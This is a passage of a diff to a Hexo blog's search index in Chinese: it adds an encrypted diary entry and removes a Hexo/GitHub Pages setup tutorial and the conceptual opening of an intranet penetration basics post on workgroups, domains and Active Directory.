       </tags>
+  </entry>
+  <entry>
+    <title>日常记录</title>
+    <url>/posts/42951.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>总结</category>
+      </categories>
   </entry>
   <entry>
     <title>易错知识</title>
@@ -3608,146 +3608,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>使用 hexo 搭建个人博客</title>
-    <url>/posts/28047.html</url>
-    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
-<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
-<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
-
-<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>
-
-<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
-<p>接着执行下列命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
-
-<p>缩写：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
-
-<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
-<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
-<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
-<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>
-
-<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
-<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
-
-<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
-<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
-<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
-<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>_config.yml</code> 中配置以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>
-
-<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
-<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
-
-<p>站内搜索</p>
-<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
-
-<p>接下来，创建一个页面来显示搜索引擎：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>
-
-<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
-<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
-<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
-<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
-<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>
-
-<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
-<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>
-
-<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
-<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
-<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
-<p>然后点击页面右上角的 New SSH key 按钮：</p>
-<p><img src="/posts/28047/new_ssh.png" alt></p>
-<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
-<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
-<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
-
-<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>
-
-<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p>
-<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>
-
-<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
-<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
-<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以不打草稿：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>
-
-<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
-
-<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
-<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
-<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
-<p>接着在本地博客文件夹下依次执行下列命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
-<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
-<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
-<p>然后点击页面右上角的 Change default branch 按钮:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
-<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
-<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>
-
-<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>
-
-<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网信息收集</title>
     <url>/posts/12754.html</url>
     <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先需要对当前所处的网络环境进行判断。判断涉及三个方面：</p>
@@ -4016,107 +3876,143 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>内网渗透基础总结</title>
-    <url>/posts/44578.html</url>
-    <content><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
-<h2 id="0x01-工作组、家庭组、域"><a href="#0x01-工作组、家庭组、域" class="headerlink" title="0x01 工作组、家庭组、域"></a>0x01 工作组、家庭组、域</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul>
-<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
-<li>通常情况下，计算机的数量不超过二十台。</li>
-<li>工作组不受密码保护。</li>
-<li>所有的计算机必须在同一本地网络或子网中。</li>
-</ul>
-<h3 id="家庭组"><a href="#家庭组" class="headerlink" title="家庭组"></a>家庭组</h3><ul>
-<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
-<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
-</ul>
-<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
-<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
-<p>域控制器（ Domain Controller ，简写为 DC ）可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
-<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
-<ul>
-<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 </li>
-<li>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li>
-<li>域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
-</ul>
-<h2 id="0x02-域的分类"><a href="#0x02-域的分类" class="headerlink" title="0x02 域的分类"></a>0x02 域的分类</h2><ul>
-<li>单域</li>
-<li>父域、子域</li>
-<li>域树</li>
-<li>域森林</li>
-<li>DNS域名服务器</li>
-</ul>
-<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
-<p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
-<h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
-<p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p>
-<p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
-<p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p>
-<p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
-<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><ul>
-<li><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p>
-</li>
-<li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
-</li>
-<li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
-</li>
-</ul>
-<p>abc.com 是一级域</p>
-<p>asia是二级域</p>
-<p><img src="/posts/44578/1.png" alt></p>
-<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p>
-<p><img src="/posts/44578/2.png" alt></p>
-<h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><ul>
-<li>DNS域名服务器是进行域名和与之对应的IP地址转换的服务器。</li>
-<li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等等。</li>
-<li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li>
-</ul>
-<h2 id="0x03-活动目录-AD"><a href="#0x03-活动目录-AD" class="headerlink" title="0x03 活动目录(AD)"></a>0x03 活动目录(AD)</h2><ul>
-<li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li>
-<li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li>
-<li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li>
-</ul>
-<p>**<br>逻辑结构**</p>
-<ul>
-<li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>”。</li>
-<li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li>
-</ul>
-<p><strong>活动目录的主要功能</strong></p>
-<ol>
-<li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li>
